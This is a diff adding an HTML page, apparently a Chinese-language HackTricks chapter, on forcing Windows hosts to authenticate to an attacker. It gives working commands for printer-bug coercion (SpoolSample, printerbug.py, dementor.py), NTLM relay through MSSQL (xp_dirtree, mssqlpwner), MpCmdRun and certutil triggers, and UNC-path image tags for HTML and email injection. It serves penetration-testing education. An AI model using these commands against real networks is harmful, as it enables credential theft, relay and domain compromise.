@@ -1,0 +1,299 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Force NTLM Privileged Authentication</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="强制-ntlm-特权认证"><a class="header" href="#强制-ntlm-特权认证">强制 NTLM 特权认证</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="sharpsystemtriggers"><a class="header" href="#sharpsystemtriggers">SharpSystemTriggers</a></h2>
+<p><a href="https://github.com/cube0x0/SharpSystemTriggers"><strong>SharpSystemTriggers</strong></a> 是一个用 C# 编写的 <strong>远程认证触发器</strong> 的 <strong>集合</strong>，使用 MIDL 编译器以避免第三方依赖。</p>
+<h2 id="打印机后台处理服务滥用"><a class="header" href="#打印机后台处理服务滥用">打印机后台处理服务滥用</a></h2>
+<p>如果 <em><strong>打印后台处理程序</strong></em> 服务 <strong>已启用，</strong> 您可以使用一些已知的 AD 凭据向域控制器的打印服务器 <strong>请求</strong> 新打印作业的 <strong>更新</strong>，并告诉它 <strong>将通知发送到某个系统</strong>。<br />
+请注意，当打印机将通知发送到任意系统时，它需要 <strong>对该系统进行认证</strong>。因此，攻击者可以使 <em><strong>打印后台处理程序</strong></em> 服务对任意系统进行认证，而该服务将在此认证中 <strong>使用计算机账户</strong>。</p>
+<h3 id="在域中查找-windows-服务器"><a class="header" href="#在域中查找-windows-服务器">在域中查找 Windows 服务器</a></h3>
+<p>使用 PowerShell 获取 Windows 计算机的列表。服务器通常是优先考虑的，因此我们将重点放在这里：</p>
+<pre><code class="language-bash">Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders &gt; servers.txt
+</code></pre>
+<h3 id="查找监听的spooler服务"><a class="header" href="#查找监听的spooler服务">查找监听的Spooler服务</a></h3>
+<p>使用稍微修改过的@mysmartlogin（Vincent Le Toux的）<a href="https://github.com/NotMedic/NetNTLMtoSilverTicket">SpoolerScanner</a>，查看Spooler服务是否在监听：</p>
+<pre><code class="language-bash">. .\Get-SpoolStatus.ps1
+ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
+</code></pre>
+<p>您还可以在Linux上使用rpcdump.py并查找MS-RPRN协议</p>
+<pre><code class="language-bash">rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
+</code></pre>
+<h3 id="请求服务对任意主机进行身份验证"><a class="header" href="#请求服务对任意主机进行身份验证">请求服务对任意主机进行身份验证</a></h3>
+<p>您可以从这里编译<a href="https://github.com/NotMedic/NetNTLMtoSilverTicket"> <strong>SpoolSample</strong></a><strong>.</strong></p>
+<pre><code class="language-bash">SpoolSample.exe &lt;TARGET&gt; &lt;RESPONDERIP&gt;
+</code></pre>
+<p>或使用 <a href="https://github.com/NotMedic/NetNTLMtoSilverTicket"><strong>3xocyte的dementor.py</strong></a> 或 <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"><strong>printerbug.py</strong></a> 如果你在Linux上</p>
+<pre><code class="language-bash">python dementor.py -d domain -u username -p password &lt;RESPONDERIP&gt; &lt;TARGET&gt;
+printerbug.py 'domain/username:password'@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;
+</code></pre>
+<h3 id="结合不受限制的委托"><a class="header" href="#结合不受限制的委托">结合不受限制的委托</a></h3>
+<p>如果攻击者已经攻陷了一台具有<a href="unconstrained-delegation.html">不受限制的委托</a>的计算机，攻击者可以<strong>使打印机对该计算机进行身份验证</strong>。由于不受限制的委托，<strong>打印机的计算机帐户的TGT</strong>将被<strong>保存在</strong>具有不受限制委托的计算机的<strong>内存</strong>中。由于攻击者已经攻陷了该主机，他将能够<strong>检索此票证</strong>并加以利用（<a href="pass-the-ticket.html">Pass the Ticket</a>）。</p>
+<h2 id="rcp-强制身份验证"><a class="header" href="#rcp-强制身份验证">RCP 强制身份验证</a></h2>
+<p>{% embed url="https://github.com/p0dalirius/Coercer" %}</p>
+<h2 id="privexchange"><a class="header" href="#privexchange">PrivExchange</a></h2>
+<p><code>PrivExchange</code>攻击是由于在<strong>Exchange Server <code>PushSubscription</code>功能</strong>中发现的缺陷。该功能允许任何具有邮箱的域用户强制Exchange服务器通过HTTP对任何客户端提供的主机进行身份验证。</p>
+<p>默认情况下，<strong>Exchange服务以SYSTEM身份运行</strong>，并被赋予过多的权限（具体来说，它在2019年之前的累积更新上具有<strong>WriteDacl权限</strong>）。此缺陷可被利用以启用<strong>向LDAP中转信息并随后提取域NTDS数据库</strong>。在无法向LDAP中转的情况下，此缺陷仍可用于在域内中转和对其他主机进行身份验证。成功利用此攻击将立即授予任何经过身份验证的域用户帐户对域管理员的访问权限。</p>
+<h2 id="在windows内部"><a class="header" href="#在windows内部">在Windows内部</a></h2>
+<p>如果您已经在Windows机器内部，可以使用以下命令强制Windows使用特权帐户连接到服务器：</p>
+<h3 id="defender-mpcmdrun"><a class="header" href="#defender-mpcmdrun">Defender MpCmdRun</a></h3>
+<pre><code class="language-bash">C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\&lt;YOUR IP&gt;\file.txt
+</code></pre>
+<h3 id="mssql"><a class="header" href="#mssql">MSSQL</a></h3>
+<pre><code class="language-sql">EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+</code></pre>
+<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a></p>
+<pre><code class="language-shell"># Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+</code></pre>
+<p>或使用另一种技术：<a href="https://github.com/p0dalirius/MSSQL-Analysis-Coerce">https://github.com/p0dalirius/MSSQL-Analysis-Coerce</a></p>
+<h3 id="certutil"><a class="header" href="#certutil">Certutil</a></h3>
+<p>可以使用 certutil.exe lolbin（微软签名的二进制文件）来强制 NTLM 认证：</p>
+<pre><code class="language-bash">certutil.exe -syncwithWU  \\127.0.0.1\share
+</code></pre>
+<h2 id="html-注入"><a class="header" href="#html-注入">HTML 注入</a></h2>
+<h3 id="通过电子邮件"><a class="header" href="#通过电子邮件">通过电子邮件</a></h3>
+<p>如果你知道想要攻陷的机器上用户的 <strong>电子邮件地址</strong>，你可以直接给他发送一封 <strong>带有 1x1 图像</strong> 的电子邮件，例如</p>
+<pre><code class="language-html">&lt;img src="\\10.10.17.231\test.ico" height="1" width="1" /&gt;
+</code></pre>
+<p>和当他打开它时，他会尝试进行身份验证。</p>
+<h3 id="mitm"><a class="header" href="#mitm">MitM</a></h3>
+<p>如果你可以对一台计算机执行MitM攻击并在他可视化的页面中注入HTML，你可以尝试在页面中注入如下图像：</p>
+<pre><code class="language-html">&lt;img src="\\10.10.17.231\test.ico" height="1" width="1" /&gt;
+</code></pre>
+<h2 id="破解-ntlmv1"><a class="header" href="#破解-ntlmv1">破解 NTLMv1</a></h2>
+<p>如果你能捕获 <a href="../ntlm/#ntlmv1-attack">NTLMv1 挑战，请阅读如何破解它们</a>。<br />
+&amp;#xNAN;<em>R记住，为了破解 NTLMv1，你需要将 Responder 挑战设置为 "1122334455667788"</em></p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/printnightmare.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/printnightmare.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
